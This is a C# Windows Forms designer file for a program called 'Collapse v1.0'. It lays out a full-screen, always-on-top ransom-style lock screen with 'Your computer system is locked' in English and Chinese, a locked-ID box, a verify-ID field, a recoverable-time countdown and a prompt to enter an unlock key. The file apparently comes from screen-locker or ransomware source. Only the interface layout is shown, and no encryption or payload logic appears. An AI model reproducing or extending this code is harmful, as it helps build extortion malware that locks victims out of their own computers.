namespace Collapse
{
    partial class collapse
    {
        /// <summary>
        /// 必需的设计器变量。
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// 清理所有正在使用的资源。
        /// </summary>
        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows 窗体设计器生成的代码

        /// <summary>
        /// 设计器支持所需的方法 - 不要修改
        /// 使用代码编辑器修改此方法的内容。
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(collapse));
            this.labelTitleEN = new System.Windows.Forms.Label();
            this.labelTitleCH = new System.Windows.Forms.Label();
            this.richTextBoxTip = new System.Windows.Forms.RichTextBox();
            this.labelVerifyIDTip = new System.Windows.Forms.Label();
            this.textBoxPwd = new System.Windows.Forms.TextBox();
            this.labelLockID = new System.Windows.Forms.Label();
            this.buttonOK = new System.Windows.Forms.Button();
            this.labelTip = new System.Windows.Forms.Label();
            this.textBoxVerifyID = new System.Windows.Forms.TextBox();
            this.labelRecoverableTimeTip = new System.Windows.Forms.Label();
            this.labelRecoverableTime = new System.Windows.Forms.Label();
            this.LockTimer = new System.Windows.Forms.Timer(this.components);
            this.Checktimer = new System.Windows.Forms.Timer(this.components);
            this.ExitTimer = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // labelTitleEN
            // 
            this.labelTitleEN.BackColor = System.Drawing.Color.Black;
            this.labelTitleEN.Dock = System.Windows.Forms.DockStyle.Top;
            this.labelTitleEN.Font = new System.Drawing.Font("宋体", 36F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.labelTitleEN.ForeColor = System.Drawing.Color.Red;
            this.labelTitleEN.Location = new System.Drawing.Point(0, 0);
            this.labelTitleEN.Name = "labelTitleEN";
            this.labelTitleEN.Size = new System.Drawing.Size(1200, 63);
            this.labelTitleEN.TabIndex = 0;
            this.labelTitleEN.Text = "Your computer system is locked";
            this.labelTitleEN.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // labelTitleCH
            // 
            this.labelTitleCH.BackColor = System.Drawing.Color.Black;
            this.labelTitleCH.Dock = System.Windows.Forms.DockStyle.Top;
            this.labelTitleCH.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.labelTitleCH.ForeColor = System.Drawing.Color.Red;
            this.labelTitleCH.Location = new System.Drawing.Point(0, 63);
            this.labelTitleCH.Name = "labelTitleCH";
            this.labelTitleCH.Size = new System.Drawing.Size(1200, 63);
            this.labelTitleCH.TabIndex = 1;
            this.labelTitleCH.Text = "您的电脑系统已被锁定";
            this.labelTitleCH.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // richTextBoxTip
            // 
            this.richTextBoxTip.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.richTextBoxTip.BackColor = System.Drawing.Color.Black;
            this.richTextBoxTip.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.richTextBoxTip.Cursor = System.Windows.Forms.Cursors.No;
            this.richTextBoxTip.Font = new System.Drawing.Font("宋体", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.richTextBoxTip.ForeColor = System.Drawing.Color.Red;
            this.richTextBoxTip.ImeMode = System.Windows.Forms.ImeMode.Off;
            this.richTextBoxTip.Location = new System.Drawing.Point(12, 129);
            this.richTextBoxTip.Name = "richTextBoxTip";
            this.richTextBoxTip.ReadOnly = true;
            this.richTextBoxTip.Size = new System.Drawing.Size(1176, 383);
            this.richTextBoxTip.TabIndex = 2;
            this.richTextBoxTip.Text = resources.GetString("richTextBoxTip.Text");
            // 
            // labelVerifyIDTip
            // 
            this.labelVerifyIDTip.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.labelVerifyIDTip.BackColor = System.Drawing.Color.Black;
            this.labelVerifyIDTip.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.labelVerifyIDTip.ForeColor = System.Drawing.Color.Red;
            this.labelVerifyIDTip.Location = new System.Drawing.Point(7, 593);
            this.labelVerifyIDTip.Name = "labelVerifyIDTip";
            this.labelVerifyIDTip.Size = new System.Drawing.Size(186, 34);
            this.labelVerifyIDTip.TabIndex = 3;
            this.labelVerifyIDTip.Text = "Verify ID：";
            this.labelVerifyIDTip.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // textBoxPwd
            // 
            this.textBoxPwd.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right)));
            this.textBoxPwd.BackColor = System.Drawing.SystemColors.Desktop;
            this.textBoxPwd.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.textBoxPwd.ForeColor = System.Drawing.Color.White;
            this.textBoxPwd.Location = new System.Drawing.Point(163, 655);
            this.textBoxPwd.Name = "textBoxPwd";
            this.textBoxPwd.Size = new System.Drawing.Size(928, 41);
            this.textBoxPwd.TabIndex = 1;
            // 
            // labelLockID
            // 
            this.labelLockID.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.labelLockID.BackColor = System.Drawing.Color.Black;
            this.labelLockID.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.labelLockID.ForeColor = System.Drawing.Color.Red;
            this.labelLockID.Location = new System.Drawing.Point(1, 655);
            this.labelLockID.Name = "labelLockID";
            this.labelLockID.Size = new System.Drawing.Size(156, 41);
            this.labelLockID.TabIndex = 5;
            this.labelLockID.Text = "LockedID:";
            this.labelLockID.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // buttonOK
            // 
            this.buttonOK.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.buttonOK.Cursor = System.Windows.Forms.Cursors.Hand;
            this.buttonOK.Font = new System.Drawing.Font("宋体", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.buttonOK.Location = new System.Drawing.Point(1097, 655);
            this.buttonOK.Name = "buttonOK";
            this.buttonOK.Size = new System.Drawing.Size(91, 41);
            this.buttonOK.TabIndex = 2;
            this.buttonOK.Text = "O K";
            this.buttonOK.UseVisualStyleBackColor = true;
            this.buttonOK.Click += new System.EventHandler(this.ButtonOK_Click);
            // 
            // labelTip
            // 
            this.labelTip.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.labelTip.BackColor = System.Drawing.Color.Black;
            this.labelTip.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.labelTip.ForeColor = System.Drawing.Color.Red;
            this.labelTip.Location = new System.Drawing.Point(0, 702);
            this.labelTip.Name = "labelTip";
            this.labelTip.Size = new System.Drawing.Size(1200, 49);
            this.labelTip.TabIndex = 6;
            this.labelTip.Text = "=== 输入适配您电脑的解锁密钥即可解密程序 ===";
            this.labelTip.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // textBoxVerifyID
            // 
            this.textBoxVerifyID.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right)));
            this.textBoxVerifyID.BackColor = System.Drawing.SystemColors.Desktop;
            this.textBoxVerifyID.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBoxVerifyID.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.textBoxVerifyID.ForeColor = System.Drawing.Color.Red;
            this.textBoxVerifyID.Location = new System.Drawing.Point(199, 593);
            this.textBoxVerifyID.Name = "textBoxVerifyID";
            this.textBoxVerifyID.ReadOnly = true;
            this.textBoxVerifyID.Size = new System.Drawing.Size(989, 34);
            this.textBoxVerifyID.TabIndex = 8;
            this.textBoxVerifyID.Text = "XXX";
            this.textBoxVerifyID.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // labelRecoverableTimeTip
            // 
            this.labelRecoverableTimeTip.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.labelRecoverableTimeTip.BackColor = System.Drawing.Color.Black;
            this.labelRecoverableTimeTip.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.labelRecoverableTimeTip.ForeColor = System.Drawing.Color.Red;
            this.labelRecoverableTimeTip.Location = new System.Drawing.Point(351, 516);
            this.labelRecoverableTimeTip.Name = "labelRecoverableTimeTip";
            this.labelRecoverableTimeTip.Size = new System.Drawing.Size(276, 34);
            this.labelRecoverableTimeTip.TabIndex = 9;
            this.labelRecoverableTimeTip.Text = "RecoverableTime：";
            this.labelRecoverableTimeTip.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // labelRecoverableTime
            // 
            this.labelRecoverableTime.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right)));
            this.labelRecoverableTime.BackColor = System.Drawing.Color.Black;
            this.labelRecoverableTime.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.labelRecoverableTime.ForeColor = System.Drawing.Color.Red;
            this.labelRecoverableTime.Location = new System.Drawing.Point(633, 516);
            this.labelRecoverableTime.Name = "labelRecoverableTime";
            this.labelRecoverableTime.Size = new System.Drawing.Size(172, 34);
            this.labelRecoverableTime.TabIndex = 10;
            this.labelRecoverableTime.Text = "00:00:00";
            this.labelRecoverableTime.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // LockTimer
            // 
            this.LockTimer.Enabled = true;
            this.LockTimer.Interval = 1000;
            this.LockTimer.Tick += new System.EventHandler(this.LockTimer_Tick);
            // 
            // Checktimer
            // 
            this.Checktimer.Interval = 500;
            this.Checktimer.Tick += new System.EventHandler(this.Checktimer_Tick);
            // 
            // ExitTimer
            // 
            this.ExitTimer.Interval = 3000;
            this.ExitTimer.Tick += new System.EventHandler(this.ExitTimer_Tick);
            // 
            // collapse
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.AutoSize = true;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(1200, 760);
            this.Controls.Add(this.labelRecoverableTime);
            this.Controls.Add(this.labelRecoverableTimeTip);
            this.Controls.Add(this.textBoxVerifyID);
            this.Controls.Add(this.labelTip);
            this.Controls.Add(this.buttonOK);
            this.Controls.Add(this.labelLockID);
            this.Controls.Add(this.textBoxPwd);
            this.Controls.Add(this.labelVerifyIDTip);
            this.Controls.Add(this.richTextBoxTip);
            this.Controls.Add(this.labelTitleCH);
            this.Controls.Add(this.labelTitleEN);
            this.Cursor = System.Windows.Forms.Cursors.No;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "collapse";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Collapse ---- v1.0";
            this.TopMost = true;
            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
            this.Load += new System.EventHandler(this.Collapse_Load);
            this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Collapse_KeyDown);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label labelTitleEN;
        private System.Windows.Forms.Label labelTitleCH;
        private System.Windows.Forms.RichTextBox richTextBoxTip;
        private System.Windows.Forms.Label labelVerifyIDTip;
        private System.Windows.Forms.TextBox textBoxPwd;
        private System.Windows.Forms.Label labelLockID;
        private System.Windows.Forms.Button buttonOK;
        private System.Windows.Forms.Label labelTip;
        private System.Windows.Forms.TextBox textBoxVerifyID;
        private System.Windows.Forms.Label labelRecoverableTimeTip;
        private System.Windows.Forms.Label labelRecoverableTime;
        private System.Windows.Forms.Timer LockTimer;
        private System.Windows.Forms.Timer Checktimer;
        private System.Windows.Forms.Timer ExitTimer;
    }
}

